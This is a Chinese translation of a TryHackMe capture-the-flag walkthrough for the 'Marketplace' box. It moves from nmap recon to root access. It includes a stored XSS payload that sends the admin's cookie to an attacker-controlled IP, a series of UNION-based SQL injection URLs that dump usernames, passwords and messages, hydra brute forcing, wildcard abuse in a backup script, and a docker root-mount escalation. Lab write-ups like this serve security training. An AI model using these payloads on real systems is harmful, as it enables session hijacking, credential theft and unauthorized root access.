# 商场盒子(THM)演练

> 原文：<https://infosecwriteups.com/walkthrough-on-marketplace-box-thm-bc7652cfcf9c?source=collection_archive---------3----------------------->

让我们解决来自 Tryhackme 的名为“市场”的盒子

![](img/9a7a0fbd47fb206bff5650ac4a19b313.png)

市场徽标

# 渗透测试方法

1.  **侦察**
2.  **枚举**
3.  **利用**
4.  **权限提升**

在 [Tryhackme](https://tryhackme.com/room/marketplace) 访问此框

# **侦察:-**

HTTP 和 ssh 打开时，Nmap 提供以下输出

![](img/b175d4d4149d4e55d5092c60dfcd441a.png)

Nmap

# **枚举:-**

由于有一个网络服务器，我们可以遍历网站，甚至可以在网站上注册

![](img/fdaa6bf8cdab6a7f29ac4ca7386304e6.png)

注册页面

*   通过浏览网站，我们可以添加新的列表，并将 XSS 有效载荷添加到这些值有效载荷- `<script>document.location="http://10.9.2.146:<port>/i.php?cookie="+document.cookie</script>`

![](img/00553af459811bc7f44d1d7a37e38305.png)

*   如果我们通过 Netcat 监听端口，它会等待用户点击并访问页面
*   现在在网页上，有一个选项向管理员报告我们的列表，他将批准/不批准该列表

![](img/ac42c83f58b8a91154be4294e8b52bc5.png)

*   点击`report to admin`后，将在 Netcat 监听器上检索管理 cookie

![](img/b0d33786d00537b7f4466c1d0d000614.png)

*   通过用管理 cookie 更改用户 cookie，将向我们显示管理面板，我们可以访问面板上的第一个标志

![](img/8f62f199eb3342352c959e78318e1bbf.png)

# 剥削:-

*   通过转到`Administration panel`并选择一个用户，我们将有一个从数据库获取数据的 URL
*   因此，通过输入带有用户值的`'''`,我们可以看到 SQL 错误

![](img/cc3817a0ad3f576dfa771d7537bbac56.png)

*   我们现在可以通过使用下面的命令`http://10.10.167.63/admin?user=10 union select database(),2,3,4--`来检索数据库名称

![](img/b65dda04b613d9c867af7662647a46ad.png)

*   我们可以通过下面的命令`http://10.10.167.63/admin?user=10%20%20union%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables where table_schema=database()--%20-`检索表名

![](img/b41ea6ff9c5b3b333e932089319b4508.png)

*   我们可以通过下面的命令`http://10.10.167.63/admin?user=10%20%20union%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns where table_name=users--%20-`检索列名

![](img/b816571c6dc21408b4b0eeee4285970b.png)

*   转储用户表数据`http://10.10.167.63/admin?user=10%20%20union%20select%201,group_concat(username,0x3a,password),3,4%20from users--%20-`

![](img/c95d0fd8ae3ef2794bbfcbe892aaab9f.png)

*   消息表的检索列`http://10.10.167.63/admin?user=10%20%20union%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns where table_name='messages'--%20-`

![](img/fc7198c568a41946ef119c9c068aaa40.png)

*   转储消息表数据`http://10.10.167.63/admin?user=10%20%20union%20select%201,group_concat(message_content),3,4%20from%20messages--%20-`

![](img/4e5889a8fa41bb7bf9db76200943d410.png)

*   消息内容为将成为`system,jack,michael`的用户暴露`ssh password`
*   因此，我们可以使用 hydra 使用检索到的密码暴力破解用户名，结果发现 ssh 密码属于 jake

![](img/9f84c0c0a6ddc9a3edae8a1f60dbffca.png)

# 权限提升

*   通过 ssh 以`jake`的身份登录，我们可以在 jake 目录中看到`user.txt`
*   通过运行`sudo -l`，我们可以看到杰克可以作为迈克尔运行`/opt/backups/backup.sh`
*   通过使用下面的命令，我们可以利用 backup.sh 中的`*`
*   然后通过升级 backup.sh 和 shell.sh 的权限，我们就可以运行并得到一个 Michael 的 shell 了
*   通过接收 shell，我们可以使用`python -c "import pty;pty.spawn('/bin/bash')"`升级到 TTY

![](img/b10c6cadc6cacbac5b9165e8ca227032.png)

*   现在，我们可以创建一个新的 docker 容器，将根文件系统挂载到/mnt

![](img/f5e9618bfc3e3a574fffba01dad1bb44.png)

*   我们可以从`/root/root.txt`访问`root.txt`